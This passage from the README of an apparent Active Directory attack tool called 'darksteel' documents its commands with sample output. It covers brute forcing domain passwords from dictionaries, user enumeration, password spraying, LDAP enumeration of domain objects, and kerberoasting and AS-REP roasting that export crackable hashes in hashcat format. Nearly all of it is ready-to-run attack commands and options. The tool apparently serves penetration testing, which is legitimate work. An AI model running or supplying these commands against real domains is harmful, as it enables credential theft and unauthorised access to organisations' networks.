   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.7


[+] SUCCESS:     zz@test.com:123456
Done! Tested logins in 0.024 seconds
```

##### 3、Blasting individual users with a password dictionary

```
darksteel.exe blast -m blastpass -dc 192.168.1.1 -domain test.com -user zz -passfile pass.txt
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.8


[+] SUCCESS:     zz@test.com:123456
Done! Tested logins in 0.013 seconds
```

##### 4、Use username password dictionary blasting

```
darksteel.exe blast -m userpass -dc 192.168.1.1 -test.com -upfile userpass.txt
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.8


[+] SUCCESS:     zz@test.com:123456
Done! Tested logins in 0.010 seconds
```

# Other Uses
## ldap

##### Support password for hash
```
darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass hash 
```

##### Query a single entry in the domain -m specifies

```
darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass 123456 -m computer
```
##### Query all assignment information -w Specify

```
darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass 123456 -w all
```
#### Optional parameters

```
-o                  Save files (not including custom queries)

-ldapsizelimit      Maximum number of queries (default all)

-m                  Specify individual query content

-w                  Specify the contents of a separate inquiry assignment
```


## kerberos
##### kerberoasting（Support password for hash）

##### Utilize all users and export

```
darksteel kerberos -dc 192.168.1.1 -domain test.com -user administrator -pass 123 -m kerberoast
```
##### Use the specified test user and output

```
darksteel kerberos -dc 192.168.1.1 -domain test.com -user administrator -pass 123 -m kerberoast -tuser test
```

##### Authentication using TGT (only single user can be utilized)

```
darksteel kerberos -dc 192.168.1.1 -ticket 123.kirbi -m kerberoast -tuser test
```

##### asreproast（Support password for hash）

##### Utilize all users and export

```
darksteel kerberos -dc 192.168.1.1 -domain test.com -user administrator -pass 123 -m asreproast
```

##### Use the specified test user and output

```
darksteel kerberos -dc 192.168.1.1 -domain test.com  -m asreproast -tuser test
```
#### Optional parameters

```
-o                  Save files (not including custom queries)

-ldapsizelimit      Maximum number of queries (default all)

-enctype            Select encryption method (default rc4)

-format             Select format (default hashcat)
```

## blast

##### Domain User Enumeration

```
darksteel blast -m userenum -dc 192.168.1.1 -domain test.com -userfile user.txt
```
##### Password spray

```
darksteel blast -m passspray -dc 192.168.1.1 -domain test.com -userfile user.txt -pass 123456
```

##### Single User Password Blast

```
darksteel blast -m blastpass -dc 192.168.1.1 -domain test.com -user admin -passfile password.txt
```

##### User corresponding password blast (dictionary format admin:123456)

```
darksteel blast -m userpass -dc 192.168.1.1 -domain test.com -upfile userpassword.txt
```

#### Optional parameters
```
-v      Output failure message

-t      Thread setting (default 20)

-o      Output file

blast can be used without specifying dc if it is used within a domain. ldap queries are not currently supported
```

# TODO
```
1、Continue to add other ways to utilize

2、Add additional information gathering content

3、Modify bugs
```

# Thank
https://github.com/jcmturner/gokrb5

https://github.com/go-ldap/ldap

https://github.com/ropnop/kerbrute
